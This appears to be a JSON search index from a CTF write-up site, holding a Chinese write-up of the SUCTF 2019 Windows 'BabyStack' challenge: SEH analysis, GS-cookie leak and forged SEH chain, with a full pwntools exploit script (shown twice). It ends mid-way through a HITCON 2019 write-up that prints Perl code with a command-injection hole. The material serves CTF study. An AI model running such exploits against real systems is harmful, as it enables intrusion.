\u53ef\u4ee5\u770b\u51fa\uff0c\u5b9e\u9645\u4e0a\u662f\u628a\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a16\u8fdb\u5236\u6570\uff0c\u5b58\u5728v30\u4e2d\uff0c\u7136\u540e\u88ab\u4f20\u5165esi\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u8f93\u5165\u7684\u5b57\u6bcd\u5fc5\u987b\u4e3a\u5927\u5199\u3002\u56e0\u6b64\uff0c\u8f93\u516500D78551\u5373\u53ef\uff0c\u5176\u4e2d0\u7528\u6765\u5360\u4f4d\uff0c\u4ee5\u8fbe\u52308\u4f4d\u3002 \u6b64\u65f6\uff0c\u6211\u4eec\u89e6\u53d1\u4e86SEH\uff0c\u8fdb\u5165\u5f02\u5e38\u5904\u7406\u51fd\u6570\uff0c\u901a\u8fc7\u7ed3\u6784\u4f53\u53ef\u4ee5\u770b\u5230\uff0c\u8fdb\u5165\u4e86\u53e6\u4e00\u4e2a\u7279\u5b9a\u7684\u51fd\u6570 \u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e2d\uff0c\u5728\u4e00\u4e2a10\u6b21\u7684\u5faa\u73af\u4e2d\uff0c\u53ef\u4ee5\u4efb\u610f\u5730\u5740\u8bfb\u3002\u800c\u53e6\u4e00\u4e2a\u51fd\u6570\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u5b58\u50a8\u5728\u6808\u4e0a\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u4e3a0x100\uff0c\u731c\u6d4b\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6808\u6ea2\u51fa\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u662f\u5426\u80fd\u6808\u6ea2\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u4ece\u800cgetshell\u3002\u6216\u8005\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u8003\u8651\u901a\u8fc7\u8bfb\u975e\u6cd5\u5730\u5740\u6216\u8005\u6808\u6ea2\u51fa\u800c\u518d\u6b21\u89e6\u53d1\u5f02\u5e38\u3002\u800c\u6b64\u5904\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u5730\u5740\u8bfb\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4f2a\u9020\u4e00\u4e2aSEH\u5757\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5148\u67e5\u627e\u770b\u770b\u662f\u5426\u6709system\u51fd\u6570\u53ef\u4ee5\u8c03\u7528\u3002 \u627e\u5230\u4e00\u4e2a\u76f4\u63a5call system\u7684\u5730\u5740\uff0c\u8df3\u8fdb\u53bb\u770b\uff0c\u53d1\u73b0\u8fd8\u662f\u5728\u4e4b\u524d\u90a3\u4e2a\u51fd\u6570\u4e2d\uff0c\u4f46\u662f\u672a\u88ab\u53cd\u7f16\u8bd1\uff0c\u76f4\u63a5\u901a\u8fc7call system\u6267\u884ctype flag.txt\u3002\u5982\u679c\u6211\u4eec\u80fd\u63a7\u5236\u7a0b\u5e8f\u8df3\u5230\u8fd9\u4e2a\u5730\u65b9\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u62ff\u5230flag\u3002 \u800c\u8fd9\u4e2a\u4f4d\u7f6e\u53ef\u4ee5\u901a\u8fc7\u548c\u6307\u5411main\u51fd\u6570\u7684\u6307\u9488\u7684\u5730\u5740\u7684\u504f\u79fb\u6765\u8ba1\u7b97 \u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7 $$ *MAINaddress+8266-3963 = *MAINaddress + 4903 $$ \u6765\u8df3\u8f6c\u5230\u83b7\u53d6flag\u6307\u4ee4\u7684\u5730\u5740\u3002 \u90a3\u4e48\u5982\u4f55\u89e6\u53d1\u4efb\u610f\u5730\u5740\u8bfb\u548c\u89e6\u53d1\u6808\u7684\u51fd\u6570\uff1f \u4efb\u610f\u5730\u5740\u8bfb\u53ea\u662f\u901a\u8fc7strcmp\u5224\u65ad\uff0c\u56e0\u6b64\u53ea\u8981\u8f93\u5165yes\u5373\u53ef\u3002 \u6808\u7684\u51fd\u6570\u5219\u9700\u8981\u901a\u8fc7\u53cc\u5c42if\uff0c\u53ea\u8981\u8f93\u5165\u4e0d\u4e3ayes\uff0c\u4e0d\u4e3ano\u7684\u4efb\u610f\u5b57\u7b26\u4e32\u5373\u53ef\u3002 \u4e0b\u4e00\u6b65\u5373\u53ef\u4ee5\u5f00\u59cb\u6784\u9020SEH\u5757\u4e86\uff0c\u5148\u60f3\u529e\u6cd5\u8bfb\u53d6\u4e0a\u4e00\u4e2aSEH\u5757\u3002\u53ef\u4ee5\u4ecemain\u51fd\u6570\u4e2d\u770b\u5230\uff0c\u4e0a\u4e00\u4e2aSEH\u5757\u4fe1\u606f\u5b58\u5165\u6808\u4e2d\u65f6\u4e0e\u4e00\u4e2a___security_cookie\u505a\u4e86\u5f02\u6216\uff0c\u56e0\u6b64\u901a\u8fc7\u6307\u5411main\u51fd\u6570\u7684\u6307\u9488\u7684\u5730\u5740\u52a0\u4e0a\u504f\u79fb\u503c\u83b7\u53d6\u8be5cookie. \u7531\u6b64\u53ef\u77e5\uff0c $$ cookie = *MAINaddress - 03963 + 7c004 = *MAINaddress + 786a1 $$ \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u503c\u4f2a\u9020GS\uff0c\u4ece\u800c\u7ed5\u8fc7GS\u3002 \u800c\u6808\u4e0a\u503c\u7684\u5730\u5740\u53ef\u4ee5\u901a\u8fc7\u6808\u57fa\u5740\u52a0\u504f\u79fb\u83b7\u53d6\u3002 \u5728\u6808\u4e0a\u4f2a\u9020SEH\u3001GS\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u6808\u6ea2\u51fa\u6216\u8005\u8bfb\u975e\u6cd5\u5730\u5740\u6765\u89e6\u53d1SEH\u4e86\u3002\u56e0\u4e3a\u518d\u6b21\u6784\u9020\u6808\u6ea2\u51fa\u6015\u4f1a\u8986\u76d6\u4e4b\u524d\u6784\u9020\u7684SEH\uff0c\u56e0\u6b64\u76f4\u63a5\u89e6\u53d1\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u7136\u540e\u8f93\u5165\u4efb\u4e00\u5b57\u7b26\u5c31\u53ef\u4ee5\u4e86\u3002 EXP \u7531\u4e8e\u6bd4\u8d5b\u670d\u52a1\u5668\u5173\u95ed\uff0c\u56e0\u6b64\u901a\u8fc7windows\u914d\u7f6e\u5f00\u653eSSH\u7ed9ubuntu\uff0c\u8fdb\u884c\u6d4b\u8bd5\u3002 from pwn import * context . log_level = debug p = remote ( 192.168.43.254 , 22 ) p . sendline ( BabyStack.exe ) p . recvuntil ( stack address = ) stack_addr = int ( p . recvuntil ( \\n ) . strip (), 16 ) p . recvuntil ( main address = ) main_addr = int ( p . recvuntil ( \\n ) . strip (), 16 ) I_know = hex ( main_addr + 0x4BF3 )[ 2 :] . upper () . rjust ( 8 , 0 ) #print hex(stack_addr),hex(main_addr) stack1 = stack_addr - 0x3C stack2 = stack_addr - 0x38 stack3 = stack_addr - 0x34 stack4 = stack_addr - 0x30 shell = main_addr + 0x4903 SEH_scope_table = p32 ( 0xFFFFFFE4 ) SEH_scope_table += p32 ( 0 ) SEH_scope_table += p32 ( 0xFFFFFFC0 ) SEH_scope_table += p32 ( 0 ) SEH_scope_table += p32 ( 0xFFFFFFFE ) SEH_scope_table += p32 ( shell ) SEH_scope_table += p32 ( shell ) cookie_addr = main_addr + 0x786A1 GS_addr = stack_addr - 0x18 #pause() p . recvuntil ( So,Can You Tell me what did you know? \\n ) p . sendline ( I_know ) p . recvuntil ( Do you want to know more? \\n ) p . sendline ( yes ) p . recvuntil ( Where do you want to know? \\n ) p . sendline ( str ( cookie_addr )) p . recvuntil ( is ) cookie = int ( p . recvuntil ( \\n ), 16 ) #print hex(cookie) p . recvuntil ( Do you want to know more? \\n ) p . sendline ( yes ) p . recvuntil ( Where do you want to know? \\n ) p . sendline ( str ( stack1 )) p . recvuntil ( is ) stack11 = int ( p . recvuntil ( \\n ), 16 ) #print hex(stack11) p . recvuntil ( Do you want to know more? \\n ) p . sendline ( yes ) p . recvuntil ( Where do you want to know? \\n ) p . sendline ( str ( stack2 )) p . recvuntil ( is ) stack22 = int ( p . recvuntil ( \\n ), 16 ) #print hex(stack22) p . recvuntil ( Do you want to know more? \\n ) p . sendline ( yes ) p . recvuntil ( Where do you want to know? \\n ) p . sendline ( str ( stack3 )) p . recvuntil ( is ) stack33 = int ( p . recvuntil ( \\n ), 16 ) #print hex(stack33) p . recvuntil ( Do you want to know more? \\n ) p . sendline ( yes ) p . recvuntil ( Where do you want to know? \\n ) p . sendline ( str ( stack4 )) p . recvuntil ( is ) stack44 = int ( p . recvuntil ( \\n ), 16 ) #print hex(stack44) payload = A * 4 payload += SEH_scope_table payload += A * 112 #payload = A * 4 #payload = A * 4 #payload = A * 4 payload += p32 ( stack11 ) payload += p32 ( stack22 ) payload += p32 ( stack33 ) payload += p32 ( stack44 ) payload += p32 ( main_addr + 0x1019A30 - 0x101395E ) payload += p32 ( cookie ^ GS_addr ) payload += p32 ( 0 ) #pause() p . recvuntil ( Where do you want to know? \\n ) p . sendline ( aaa ) p . sendline ( payload ) p . recvuntil ( Do you want to know more? \\n ) p . sendline ( yes ) p . recvuntil ( Where do you want to know? \\n ) p . sendline ( aaa ) p . interactive ()","title":"BabyStack"},{"location":"pwn/Windows/BabyStack/#baby-stack","text":"SUCTF 2019","title":"Baby Stack"},{"location":"pwn/Windows/BabyStack/#windows-seh","text":"windows\u4e0b\u901a\u8fc7SEH\u673a\u5236\u5904\u7406\u5f02\u5e38\u3002\u5728\u8fdb\u7a0b\u8fd0\u884c\u53d1\u751f\u5f02\u5e38\u65f6\uff0cwindows\u59d4\u6258\u8fdb\u7a0b\u8fdb\u884c\u5904\u7406\u3002\u82e5\u7a0b\u5e8f\u4e2d\u6709\u9884\u5148\u6784\u9020\u7684\u5f02\u5e38\u5904\u7406\u94fe(SEH\u94fe)\uff0c\u5219\u7a0b\u5e8f\u4f1a\u6839\u636eSEH\u94fe\u5904\u7406\u5f02\u5e38\uff0c\u5e76\u6309\u7167\u6307\u793a\u7ee7\u7eed\u6267\u884c\uff1b\u82e5\u7a0b\u5e8f\u4e2d\u65e0SEH\u94fe\uff0c\u5219\u7cfb\u7edf\u4f1a\u8c03\u7528\u9ed8\u8ba4\u7684SEH\u94fe\u5904\u7406\u5f02\u5e38\uff0c\u5e76\u5c06\u7a0b\u5e8f\u7ec8\u6b62\u3002 SEH\u94fe\u4e3a\u5355\u94fe\u8868\uff0c\u7ed3\u6784\u4f53\u4e2d\u5b58\u5728\u4e24\u4e2a\u5143\u7d20\uff1a1\u3001\u6307\u5411\u4e0b\u4e00\u4e2aSEH\u5757\u7684\u6307\u9488\uff1b2\u3001\u5f02\u5e38\u5904\u7406\u51fd\u6570\u3002\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u89e6\u53d1\u5f02\u5e38\u5904\u7406\u65f6\uff0c\u4f1a\u4eceSEH\u7684\u7b2c\u4e00\u4e2a\u5757\u5f00\u59cb\u904d\u5386\uff0c\u82e5\u7b2c\u4e00\u4e2a\u5757\u672a\u80fd\u5904\u7406\u5f02\u5e38\u65f6\uff0c\u4fbf\u5c06\u5f02\u5e38\u4f20\u9012\u81f3\u4e0b\u4e00\u4e2a\u5757\u8fdb\u884c\u5904\u7406\uff0c\u76f4\u5230\u5f02\u5e38\u88ab\u5904\u7406\u6216\u904d\u5386\u5b8c\u6240\u6709\u7684SEH\u5757\u3002 \u901a\u8fc7Windbg\u83b7\u53d6teb\u4e4b\u540e\uff0c\u53ef\u4eceteb\u8868\u5730\u5740\u83b7\u53d6SEH\u94fe\u5730\u5740\uff0c\u4ece\u800c\u904d\u5386SEH\u94fe\uff0c\u4ece\u4e2d\u53ef\u4ee5\u770b\u5230SEH\u5757\u4e2d\u7684\u7ed3\u6784\u3002 0:000 !teb Wow64 TEB32 at 00000000009b1000 ...... 0:000 dt ntdll!_EXCEPTION_REGISTRATION_RECORD -l next poi(9b1000) next at 0x00000000`009b3000 --------------------------------------------- +0x000 Next : 0x00b00000`ffffffff _EXCEPTION_REGISTRATION_RECORD +0x008 Handler : 0x00000000`00aff000 _EXCEPTION_DISPOSITION +aff000 next at 0x00b00000`ffffffff --------------------------------------------- +0x000 Next : ???? +0x008 Handler : ???? Memory read error 00b0000100000007 \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5e38\u89c1\u7684\u5f02\u5e38\u5982\u4e0b\uff1a windows-SEH\u8be6\u89e3 \u770b\u96ea\u8bba\u575b https://bbs.pediy.com/thread-249592.htm","title":"Windows SEH"},{"location":"pwn/Windows/BabyStack/#_1","text":"\u9898\u76ee\u521d\u59cb\u65f6\u5373\u544a\u8bc9\u4e86\u6808\u7684\u5730\u5740\u548cmain\u51fd\u6570\u7684\u5730\u5740\uff0c\u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\u7ed9\u7684\u5730\u5740\u662f\u5b58\u50a8main\u51fd\u6570\u5730\u5740\u7684\u503c\u7684\u5730\u5740\uff0c\u5373\u6307\u5411main\u51fd\u6570\u7684\u6307\u9488\u7684\u5730\u5740\u3002 \u4e0e\u9898\u76ee\u4ea4\u4e92\u7684\u552f\u4e00\u65b9\u5f0f\u5c31\u662f\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u901a\u8fc7\u9759\u6001\u5206\u6790\u770b\u5230\u8be5\u5b57\u7b26\u4e32\u5b58\u5728\u6808\u4e0a\uff0c\u800c\u7ecf\u8fc7strlen\u5224\u65ad\u5b57\u7b26\u4e32\u957f\u5ea6\u4e4b\u540e\uff0c\u8fdb\u884c\u4e86\u67d0\u4e9b\u8fd0\u7b97\uff0c\u7136\u540e\u8c03\u7528\u8f93\u51fa\u5b57\u7b26\u4e32\u7684\u51fd\u6570\uff0c\u800c\u540e\u9000\u51fa\u3002\u800c\u8f93\u5165\u91c7\u7528\u7684\u662f\u63a7\u5236\u8f93\u5165\u4e2a\u6570\u7684scanf_s\u4e00\u7c7b\u51fd\u6570\uff0c\u56e0\u6b64\u6808\u6ea2\u51fa\u7684\u53ef\u80fd\u6027\u8f83\u5c0f\u3002 \u56e0\u6b64\uff0c\u8003\u8651\u901a\u8fc7\u8986\u76d6SEH\u540e\uff0c\u89e6\u53d1\u5f02\u5e38\uff0c\u8df3\u5230\u4f2a\u9020\u7684SEH\u4e2d\u3002\u800c\u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u7684\u5e38\u89c1\u5f02\u5e38\uff0c\u5224\u65ad\u53ef\u80fd\u5728\u672c\u7a0b\u5e8f\u4e2d\u89e6\u53d1\u7684\u5f02\u5e38\u6709\uff1a\u6d6e\u70b9\u6570\u6ea2\u51fa\u3001\u8bfb\u5199\u4e0d\u53ef\u8bbf\u95ee\u5730\u5740\u6216\u9664\u6570\u4e3a0. \u9996\u5148\u6392\u9664\u6700\u5bb9\u6613\u7684\uff0c\u9664\u6570\u4e3a0\u3002\u5224\u65ad\u9664\u6570\u4e3a0\u7684\u65b9\u5f0f\u662f\u5148\u627e\u5230\u662f\u5426\u5b58\u5728\u9664\u6cd5\uff0c\u53ea\u8981\u5b58\u5728\u9664\u6cd5\uff0c\u5c31\u6709\u9664\u6570\u4e3a0\u7684\u53ef\u80fd\u3002\u901a\u8fc7\u5b57\u7b26\u4e32\u641c\u7d22\uff0c\u5728\u6c47\u7f16\u6307\u4ee4\u4e2d\u641c\u7d22\u201cdiv\u201d\u6307\u4ee4\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728\u9664\u6cd5\u3002 \u901a\u8fc7\u641c\u7d22\u7ed3\u679c\u53ef\u4ee5\u770b\u5230\uff0c\u5b58\u5728\u5927\u91cf\u7684\u9664\u6cd5\uff0c\u56e0\u6b64\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u6784\u9020\u96640\u5bfc\u81f4SEH\u3002 \u4ece\u7b2c\u4e00\u4e2a\u770b\u8d77\uff0c\u5728main\u51fd\u6570\u4e2d\u6709\u4e00\u6b21div\u64cd\u4f5c\uff0c\u5728\u8fd0\u7b97\u4e4b\u540e\uff0c\u8f93\u51fa\u5b57\u7b26\u4e32\u4e4b\u524d\u3002 \u800c\u9664\u6570[esi]\u662f\u901a\u8fc7\u8fd0\u7b97 $$ [esi] - [eax] $$ \u5f97\u5230\u7684\uff0c\u800c[esi]\u53c8\u662f\u6808\u4e0a\u7684\u503c\u4f20\u9012\u8fdb\u6765esi\u5f97\u5230\u7684\uff0c\u800c\u8be5\u503c\u53c8\u662f\u901a\u8fc7main\u51fd\u6570\u4e2d\u7684\u8ba1\u7b97\u8fc7\u7a0b\u5f97\u5230\u7684\uff1a \u56e0\u6b64\u6211\u4eec\u5982\u679c\u80fd\u6784\u9020\u51fa\u5408\u9002\u7684v30\uff0c\u4f7f\u4e4b\u4e0eeax\u76f8\u7b49\uff0c\u5219\u53ef\u4ee5\u4f7f\u9664\u6570\u4e3a0\uff0c\u89e6\u53d1SEH\u3002 \u901a\u8fc7\u52a8\u6001\u8c03\u8bd5\uff0c\u53ef\u4ee5\u770b\u5230eax\u7684\u503c\u3002\u591a\u6b21\u8c03\u8bd5\u4e4b\u540e\uff0c\u53d1\u73b0\u65e0\u8bba\u8f93\u5165\u5982\u4f55\u6539\u53d8\uff0c\u6700\u7ec8eax\u7684\u503c\u662f\u4ece\u6808\u4e2dpop\u51fa\u6765\u7684\uff0c\u53ea\u4e0e\u6307\u5411main\u51fd\u6570\u6307\u9488\u7684\u5730\u5740\u6210\u56fa\u5b9a\u504f\u79fb\uff0c\u4e3a4BF3\u3002\u56e0\u6b64\uff1a $$ [eax] = MAINaddress + 4BF3 $$ \u800c\u901a\u8fc7\u8fd0\u7b97\u90e8\u5206\u53cd\u63a8\u5982\u4e0b\uff1a\u5148\u9006\u51fa\u8fd0\u7b97\u90e8\u5206\u7684\u4ee3\u7801\uff0c\u5e76\u7b80\u5316\uff0c\u5982\u4e0b\uff1a int v7 = 0 ; int v30 = 0 ; for ( v22 = 0 ; v22 8 ; v22 ++ ) { char v23 = v31 [ v22 ]; //v31\u4e3a\u8f93\u5165\u5b57\u7b26\u4e32 if ( v23 - 0 9 ) //\u5224\u65ad\u5b57\u7b26\u5982\u679c\u4e0d\u4e3a\u6570\u5b57 { if ( v23 - A = 5 ) //\u5982\u679c\u4e3a\u5927\u5199\u7684A~F { v7 = v23 + 0x10 * v7 - 0x37 ; v30 = v7 ; } } else //\u6570\u5b57\u6216\u8005ASCII\u5c0f\u4e8e\u6570\u5b57\u7684\u5b57\u7b26 { v7 = v23 + 0x10 * ( v7 - 0x3 ); v30 = v7 ; } } \u53ef\u4ee5\u770b\u51fa\uff0c\u5b9e\u9645\u4e0a\u662f\u628a\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a16\u8fdb\u5236\u6570\uff0c\u5b58\u5728v30\u4e2d\uff0c\u7136\u540e\u88ab\u4f20\u5165esi\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u8f93\u5165\u7684\u5b57\u6bcd\u5fc5\u987b\u4e3a\u5927\u5199\u3002\u56e0\u6b64\uff0c\u8f93\u516500D78551\u5373\u53ef\uff0c\u5176\u4e2d0\u7528\u6765\u5360\u4f4d\uff0c\u4ee5\u8fbe\u52308\u4f4d\u3002 \u6b64\u65f6\uff0c\u6211\u4eec\u89e6\u53d1\u4e86SEH\uff0c\u8fdb\u5165\u5f02\u5e38\u5904\u7406\u51fd\u6570\uff0c\u901a\u8fc7\u7ed3\u6784\u4f53\u53ef\u4ee5\u770b\u5230\uff0c\u8fdb\u5165\u4e86\u53e6\u4e00\u4e2a\u7279\u5b9a\u7684\u51fd\u6570 \u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e2d\uff0c\u5728\u4e00\u4e2a10\u6b21\u7684\u5faa\u73af\u4e2d\uff0c\u53ef\u4ee5\u4efb\u610f\u5730\u5740\u8bfb\u3002\u800c\u53e6\u4e00\u4e2a\u51fd\u6570\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u5b58\u50a8\u5728\u6808\u4e0a\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u4e3a0x100\uff0c\u731c\u6d4b\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6808\u6ea2\u51fa\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u662f\u5426\u80fd\u6808\u6ea2\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u4ece\u800cgetshell\u3002\u6216\u8005\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u8003\u8651\u901a\u8fc7\u8bfb\u975e\u6cd5\u5730\u5740\u6216\u8005\u6808\u6ea2\u51fa\u800c\u518d\u6b21\u89e6\u53d1\u5f02\u5e38\u3002\u800c\u6b64\u5904\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u5730\u5740\u8bfb\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4f2a\u9020\u4e00\u4e2aSEH\u5757\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5148\u67e5\u627e\u770b\u770b\u662f\u5426\u6709system\u51fd\u6570\u53ef\u4ee5\u8c03\u7528\u3002 \u627e\u5230\u4e00\u4e2a\u76f4\u63a5call system\u7684\u5730\u5740\uff0c\u8df3\u8fdb\u53bb\u770b\uff0c\u53d1\u73b0\u8fd8\u662f\u5728\u4e4b\u524d\u90a3\u4e2a\u51fd\u6570\u4e2d\uff0c\u4f46\u662f\u672a\u88ab\u53cd\u7f16\u8bd1\uff0c\u76f4\u63a5\u901a\u8fc7call system\u6267\u884ctype flag.txt\u3002\u5982\u679c\u6211\u4eec\u80fd\u63a7\u5236\u7a0b\u5e8f\u8df3\u5230\u8fd9\u4e2a\u5730\u65b9\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u62ff\u5230flag\u3002 \u800c\u8fd9\u4e2a\u4f4d\u7f6e\u53ef\u4ee5\u901a\u8fc7\u548c\u6307\u5411main\u51fd\u6570\u7684\u6307\u9488\u7684\u5730\u5740\u7684\u504f\u79fb\u6765\u8ba1\u7b97 \u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7 $$ *MAINaddress+8266-3963 = *MAINaddress + 4903 $$ \u6765\u8df3\u8f6c\u5230\u83b7\u53d6flag\u6307\u4ee4\u7684\u5730\u5740\u3002 \u90a3\u4e48\u5982\u4f55\u89e6\u53d1\u4efb\u610f\u5730\u5740\u8bfb\u548c\u89e6\u53d1\u6808\u7684\u51fd\u6570\uff1f \u4efb\u610f\u5730\u5740\u8bfb\u53ea\u662f\u901a\u8fc7strcmp\u5224\u65ad\uff0c\u56e0\u6b64\u53ea\u8981\u8f93\u5165yes\u5373\u53ef\u3002 \u6808\u7684\u51fd\u6570\u5219\u9700\u8981\u901a\u8fc7\u53cc\u5c42if\uff0c\u53ea\u8981\u8f93\u5165\u4e0d\u4e3ayes\uff0c\u4e0d\u4e3ano\u7684\u4efb\u610f\u5b57\u7b26\u4e32\u5373\u53ef\u3002 \u4e0b\u4e00\u6b65\u5373\u53ef\u4ee5\u5f00\u59cb\u6784\u9020SEH\u5757\u4e86\uff0c\u5148\u60f3\u529e\u6cd5\u8bfb\u53d6\u4e0a\u4e00\u4e2aSEH\u5757\u3002\u53ef\u4ee5\u4ecemain\u51fd\u6570\u4e2d\u770b\u5230\uff0c\u4e0a\u4e00\u4e2aSEH\u5757\u4fe1\u606f\u5b58\u5165\u6808\u4e2d\u65f6\u4e0e\u4e00\u4e2a___security_cookie\u505a\u4e86\u5f02\u6216\uff0c\u56e0\u6b64\u901a\u8fc7\u6307\u5411main\u51fd\u6570\u7684\u6307\u9488\u7684\u5730\u5740\u52a0\u4e0a\u504f\u79fb\u503c\u83b7\u53d6\u8be5cookie. \u7531\u6b64\u53ef\u77e5\uff0c $$ cookie = *MAINaddress - 03963 + 7c004 = *MAINaddress + 786a1 $$ \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u503c\u4f2a\u9020GS\uff0c\u4ece\u800c\u7ed5\u8fc7GS\u3002 \u800c\u6808\u4e0a\u503c\u7684\u5730\u5740\u53ef\u4ee5\u901a\u8fc7\u6808\u57fa\u5740\u52a0\u504f\u79fb\u83b7\u53d6\u3002 \u5728\u6808\u4e0a\u4f2a\u9020SEH\u3001GS\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u6808\u6ea2\u51fa\u6216\u8005\u8bfb\u975e\u6cd5\u5730\u5740\u6765\u89e6\u53d1SEH\u4e86\u3002\u56e0\u4e3a\u518d\u6b21\u6784\u9020\u6808\u6ea2\u51fa\u6015\u4f1a\u8986\u76d6\u4e4b\u524d\u6784\u9020\u7684SEH\uff0c\u56e0\u6b64\u76f4\u63a5\u89e6\u53d1\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u7136\u540e\u8f93\u5165\u4efb\u4e00\u5b57\u7b26\u5c31\u53ef\u4ee5\u4e86\u3002","title":"\u5206\u6790\u8c03\u8bd5"},{"location":"pwn/Windows/BabyStack/#exp","text":"\u7531\u4e8e\u6bd4\u8d5b\u670d\u52a1\u5668\u5173\u95ed\uff0c\u56e0\u6b64\u901a\u8fc7windows\u914d\u7f6e\u5f00\u653eSSH\u7ed9ubuntu\uff0c\u8fdb\u884c\u6d4b\u8bd5\u3002 from pwn import * context . log_level = debug p = remote ( 192.168.43.254 , 22 ) p . sendline ( BabyStack.exe ) p . recvuntil ( stack address = ) stack_addr = int ( p . recvuntil ( \\n ) . strip (), 16 ) p . recvuntil ( main address = ) main_addr = int ( p . recvuntil ( \\n ) . strip (), 16 ) I_know = hex ( main_addr + 0x4BF3 )[ 2 :] . upper () . rjust ( 8 , 0 ) #print hex(stack_addr),hex(main_addr) stack1 = stack_addr - 0x3C stack2 = stack_addr - 0x38 stack3 = stack_addr - 0x34 stack4 = stack_addr - 0x30 shell = main_addr + 0x4903 SEH_scope_table = p32 ( 0xFFFFFFE4 ) SEH_scope_table += p32 ( 0 ) SEH_scope_table += p32 ( 0xFFFFFFC0 ) SEH_scope_table += p32 ( 0 ) SEH_scope_table += p32 ( 0xFFFFFFFE ) SEH_scope_table += p32 ( shell ) SEH_scope_table += p32 ( shell ) cookie_addr = main_addr + 0x786A1 GS_addr = stack_addr - 0x18 #pause() p . recvuntil ( So,Can You Tell me what did you know? \\n ) p . sendline ( I_know ) p . recvuntil ( Do you want to know more? \\n ) p . sendline ( yes ) p . recvuntil ( Where do you want to know? \\n ) p . sendline ( str ( cookie_addr )) p . recvuntil ( is ) cookie = int ( p . recvuntil ( \\n ), 16 ) #print hex(cookie) p . recvuntil ( Do you want to know more? \\n ) p . sendline ( yes ) p . recvuntil ( Where do you want to know? \\n ) p . sendline ( str ( stack1 )) p . recvuntil ( is ) stack11 = int ( p . recvuntil ( \\n ), 16 ) #print hex(stack11) p . recvuntil ( Do you want to know more? \\n ) p . sendline ( yes ) p . recvuntil ( Where do you want to know? \\n ) p . sendline ( str ( stack2 )) p . recvuntil ( is ) stack22 = int ( p . recvuntil ( \\n ), 16 ) #print hex(stack22) p . recvuntil ( Do you want to know more? \\n ) p . sendline ( yes ) p . recvuntil ( Where do you want to know? \\n ) p . sendline ( str ( stack3 )) p . recvuntil ( is ) stack33 = int ( p . recvuntil ( \\n ), 16 ) #print hex(stack33) p . recvuntil ( Do you want to know more? \\n ) p . sendline ( yes ) p . recvuntil ( Where do you want to know? \\n ) p . sendline ( str ( stack4 )) p . recvuntil ( is ) stack44 = int ( p . recvuntil ( \\n ), 16 ) #print hex(stack44) payload = A * 4 payload += SEH_scope_table payload += A * 112 #payload = A * 4 #payload = A * 4 #payload = A * 4 payload += p32 ( stack11 ) payload += p32 ( stack22 ) payload += p32 ( stack33 ) payload += p32 ( stack44 ) payload += p32 ( main_addr + 0x1019A30 - 0x101395E ) payload += p32 ( cookie ^ GS_addr ) payload += p32 ( 0 ) #pause() p . recvuntil ( Where do you want to know? \\n ) p . sendline ( aaa ) p . sendline ( payload ) p . recvuntil ( Do you want to know more? \\n ) p . sendline ( yes ) p . recvuntil ( Where do you want to know? \\n ) p . sendline ( aaa ) p . interactive ()","title":"EXP"},{"location":"reverse/","text":"waiting","title":"home"},{"location":"reverse/#waiting","text":"","title":"waiting"},{"location":"web/","text":"waiting","title":"home"},{"location":"web/#waiting","text":"","title":"waiting"},{"location":"web/CommandInjection/hitcon2019-virtual-public-network/","text":"HITCON2019-luatic(CallMeCro) Vulnerable Point of Your Network :) Foreword Congratulations to myself, because I solved an international CTF questions for the first time(Although in the end it was master lanmao who reminded me of the proper way of writing payload). Examination Site Perl Command Injection CVE-2019-11539 Analysis As you view the source code through F12, you will find there is a hint !-- Hint for you : ) a href = diag.cgi diag.cgi /a a href = DSSafe.pm DSSafe.pm /a -- Then we open the diag.cgi to get its source code #!/usr/bin/perl use lib /var/www/html/ ; use strict ; use CGI () ; use DSSafe ; sub tcpdump_options_syntax_check { my $options = shift ; return $options if system ( timeout -s 9 2 /usr/bin/tcpdump -d $options /dev/null 2 1 ) == 0 ; return undef ; } print Content-type: text/html\\n\\n ; my $options = CGI::param ( options ) ; my $output = tcpdump_options_syntax_check ( $options ) ; # backdoor :) my $tpl = CGI::param ( tpl ) ; if ( 